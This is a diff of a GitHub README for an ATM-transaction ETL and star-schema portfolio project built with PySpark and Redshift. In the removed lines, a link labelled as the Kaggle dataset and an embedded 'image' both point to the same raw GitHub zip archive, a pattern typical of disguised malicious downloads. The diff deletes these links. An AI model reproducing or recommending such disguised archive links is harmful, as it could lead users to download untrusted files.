@@ -1,24 +1,95 @@
-# SparNordETL
-Spar Nord Bank is a Danish Bank which is trying to observe the withdrawal behavior and the corresponding dependent factors to optimally manage the refill frequency. It has published dataset on (https://raw.githubusercontent.com/ANKIT21111/SparNordETL/main/stamineal/SparNordETL.zip) Kaggle .
-## Dataset featuring: 
-This data set contains various types of transactional data as well as the weather data at the time of the transaction, such as:
-Transaction Date and Time: Year, month, day, weekday, hour
-1. Status of the ATM: Active or inactive
-2. Details of the ATM: ATM ID, manufacturer name along with location details such as longitude, latitude, street name, street number and zip code
-3. The weather of the area near the ATM during the transaction: Location of measurement such as longitude, latitude, city name along with the type of weather, temperature, pressure, wind speed, cloud and so on
-4. Transaction details: Card type, currency, transaction/service type, transaction amount and error message (if any)
-## TARGET DIMENSIONAL MODEL:
-For this project Spar Nord needs there warehouse to be designed in provided target dimensional model as follows:
-![image](https://raw.githubusercontent.com/ANKIT21111/SparNordETL/main/stamineal/SparNordETL.zip)
-1. ATM dimension - This dimension will have the data related to the various ATMs present in the dataset along with the ATM number(ATM ID in the original dataset), ATM manufacturer and a reference to the ATM location and is very important for solving analytical queries related where ATM data will be used.
-2. Location dimension - This is a very important dimension containing all the location data including location name, street name, street number, zip code and even the latitude and longitude. This information will be very important for solving problems related to the particular location at which a transaction took place and can help banks in things like pinpointing locations where ATMs where demand is higher as compared to other locations. Combined with weather data in the transaction table, this can be used to further do analysis such as how weather affects the demand at ATMs at a particular location.
-3. Date dimension - This is another very important dimension which is almost always present where data such as transactional data is being dealt with. This dimension includes fields such as the full date and time timestamp, year, month, day, hour as well as the weekday for a transaction. This all can help in analysing the transaction behaviour with respect to the time at which the transaction took place and also how the transaction activity varies between weekdays and weekends.
-4. Card type dimension - This dimension has the information about the particular card type with which a particular transaction took place. This can help in performing analysis on how the number of transactions varies with respect to each different card type.
-5. Transaction fact - This is the actual fact table for the data set which contains all of the numerical data such as the currency of the transaction, service, transaction amount, message code and text as well as weather info such as description, weather id etc.
-## SCHEMA FOR ATM_DATA TARGET DIMENSIONAL MODEL:
+# 🏦 Spar Nord Bank: ATM Withdrawal Behavior & ETL Analytics 🚀
 
-1. DIM_LOCATION Column Name Data Type location_id INT location VARCHAR(50) streetname VARCHAR(255) street_number INT zipcode INT lat DECIMAL(10,3) lon DECIMAL(10,3) PRIMARY KEY location_id
-2. DIM_ATM Column Name Data Type Comments/Foreign Key atm_id INT atm_number VARCHAR(20) atm_manufacturer VARCHAR(50) atm_location_id INT PRIMARY KEY atm_id FOREIGN KEY atm_location_id REFERENCES DIM_LOCATION (location_id) 
-3. DIM_DATE Column Name Data Type date_id INT full_date_time TIMESTAMP year INT month VARCHAR(20) day INT hour INT weekday VARCHAR(20) PRIMARY KEY date_id 
-4. DIM_CARD_TYPE Column Name Data Type card_type_id INT card_type VARCHAR(30) PRIMARY KEY card_type_id 
-5. FACT_ATM_TRANS Column Name Data Type Comments/Foreign Key trans_id BIGINT atm_id INT weather_loc_id INT date_id INT card_type_id INT atm_status VARCHAR(20) currency VARCHAR(10) service VARCHAR(20) transaction_amount INT message_code VARCHAR(255) message_text VARCHAR(255) rain_3h DECIMAL(10,3) clouds_all INT weather_id INT weather_main VARCHAR(50) weather_description VARCHAR(255) PRIMARY KEY trans_id FOREIGN KEY weather_loc_id REFERENCES DIM_LOCATION (location_id) atm_id REFERENCES DIM_ATM (atm_id) date_id REFERENCES DIM_DATE (date_id) card_type_id REFERENCES DIM_CARD_TYPE (card_type_id)
+![Spark](https://img.shields.io/badge/Apache_Spark-E25A1C?style=for-the-badge&logo=apachespark&logoColor=white)
+![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
+![AWS](https://img.shields.io/badge/AWS-232F3E?style=for-the-badge&logo=amazon-aws&logoColor=white)
+![Redshift](https://img.shields.io/badge/Amazon_Redshift-8C4FFF?style=for-the-badge&logo=amazon-redshift&logoColor=white)
+
+## 📖 Project Overview
+Spar Nord Bank, a leading Danish financial institution, sought to optimize its ATM replenishment strategy. This project involved building a robust **End-to-End ETL Pipeline** to process over **2.4 million transaction records**, correlated with real-time weather data, to identify patterns in withdrawal behavior.
+
+### 🎯 Business Objective
+To analyze the impact of temporal, locational, and environmental factors (weather) on ATM usage, enabling the bank to:
+- 📉 Reduce operational costs by optimizing refill frequency.
+- 💳 Ensure high ATM availability during peak demand periods.
+- 🌦️ Understand how weather conditions affect withdrawal volumes.
+
+---
+
+## 🛠️ Tech Stack & Tools
+| Category | Technologies |
+| :--- | :--- |
+| **Big Data Engine** | Apache Spark (PySpark) |
+| **Data Ingestion** | Apache Sqoop, HDFS |
+| **Cloud Infrastructure** | AWS S3, AWS Redshift, AWS EMR (EC2) |
+| **Languages** | Python, SQL |
+| **Data Modeling** | Star Schema (Dimensional Modeling) |
+
+---
+
+## 🏗️ Data Pipeline Architecture
+
+1.  **Ingestion**: Leveraged **Apache Sqoop** to ingest raw transactional data from an RDS MySQL database into **HDFS**.
+2.  **Processing (ETL)**: Used **PySpark** to:
+    -   Perform complex data cleaning and schema enforcement.
+    -   Join transactional data with environmental weather datasets.
+    -   Transform flat data into a optimized **Star Schema**.
+3.  **Storage**: Exported processed dimensions and facts to **AWS S3** in optimized CSV/Parquet formats.
+4.  **Warehousing**: Loaded the finalized dimensional model into **Amazon Redshift** for high-performance analytical querying.
+
+---
+
+## 📊 Target Dimensional Model (Star Schema)
+
+The architecture is built around a centralized Fact table connected to optimized Dimension tables.
+
+### 1. 📍 DIM_LOCATION
+*Captures granular geographical details of ATM placements.*
+- `location_id` (PK), `location_name`, `street_name`, `zipcode`, `latitude`, `longitude`.
+
+### 🏧 2. DIM_ATM
+*Details regarding ATM hardware and status.*
+- `atm_id` (PK), `atm_number`, `manufacturer`, `location_id` (FK).
+
+### 📅 3. DIM_DATE
+*Enables temporal analysis across hours, days, and seasons.*
+- `date_id` (PK), `full_timestamp`, `year`, `month`, `day`, `weekday`, `hour`.
+
+### 💳 4. DIM_CARD_TYPE
+*Categorizes transactions by card issuer.*
+- `card_type_id` (PK), `card_type`.
+
+### 💰 5. FACT_ATM_TRANS
+*The core metrics table containing millions of rows of transaction and weather data.*
+- `trans_id` (PK), `atm_id`, `location_id`, `date_id`, `card_type_id`, `amount`, `weather_id`, `temp`, `pressure`, `humidity`, etc.
+
+---
+
+## 📈 Analytical Capabilities
+With this pipeline, recruiters and analysts can answer critical questions:
+- **Peak Hour Analysis**: *"Which weekdays see the highest withdrawal volume between 5 PM and 8 PM?"*
+- **Weather Impact**: *"Do customers withdraw more cash during rainy weather compared to sunny days?"*
+- **Location Performance**: *"Which zip codes exhibit the highest ATM 'Inactive' status frequency?"*
+- **Manufacturer Reliability**: *"Which ATM manufacturer (NCR vs. Diebold) has fewer error messages?"*
+
+---
+
+## 📁 Project Structure
+```bash
+├── SparkNordBank_SparkETLCode.py.ipynb  # Core ETL Logic (PySpark)
+├── SqoopDataIngestion.pdf               # Ingestion Configuration Details
+├── RedshiftSetup.pdf                    # Warehouse Configuration
+├── Redshift Analytical Queries.pdf       # SQL Insights & Reporting
+└── README.md                            # Project Documentation
+```
+
+---
+
+## 🚀 Key Takeaways
+- Successfully handled **large-scale data processing** using Spark's distributed computing.
+- Implemented **Industry-Standard Dimensional Modeling** to ensure fast query performance in Redshift.
+- Integrated **disparate datasets** (Banking + Weather) to provide 360-degree business insights.
+
+---
+**Developed by [Ankit Abhishek]** 👨‍💻
+*Passionate about building scalable data solutions and driving business value through analytics.*
